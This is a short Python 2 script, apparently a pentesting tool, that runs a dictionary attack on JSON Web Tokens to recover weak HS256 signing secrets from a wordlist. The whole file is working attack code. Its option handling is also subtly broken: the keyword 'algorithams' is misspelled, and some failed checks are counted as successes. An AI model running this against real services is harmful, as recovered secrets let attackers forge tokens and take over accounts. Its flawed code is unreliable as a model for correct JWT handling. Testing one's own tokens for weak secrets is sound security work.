from jwt import decode, InvalidTokenError, DecodeError
import sys

#######################################################################
# Pre-requisite
# - A word dictionary of possible secrets in a file called secret.dict
# - A text file with target JWT tokens (seperated by newline) in a file
#   called jwt.txt
# At some point I will make it args based
#######################################################################
word_dict = 'secret.dict'
jwt_fname = 'jwt.txt'

with open(jwt_fname) as j:
    tokens = j.readlines()
tokens = [x.strip() for x in tokens]

with open(word_dict) as k:
    secrets = k.readlines()
secrets = [y.strip() for y in secrets]

def crack_jwt(jwt, secrets):
    options = {
   'verify_signature': True,
   'verify_exp': True,
   'verify_nbf': False,
   'verify_iat': False,
   'verify_aud': False,
   'require_exp': False,
   'require_iat': False,
   'require_nbf': False
    }
    parts = jwt.split('.')
    if len(parts) != 3:
        print 'not a valid JWT'
        return False
    for s in secrets:
        try:
            decode(jwt, s, algorithams=['HS256'], options=options)
            return s
        except DecodeError:
            pass
        except InvalidTokenError:
            return s


if __name__ == "__main__":
    print 'Let\'s begin'
    for token in tokens:
        secret = crack_jwt(token, secrets)
        print secret
        if secret:
            print 'Found a weak secret: %s for Token: %s' %(secret, token)
        else:
            print 'Could not find secret for token %s' %(token)

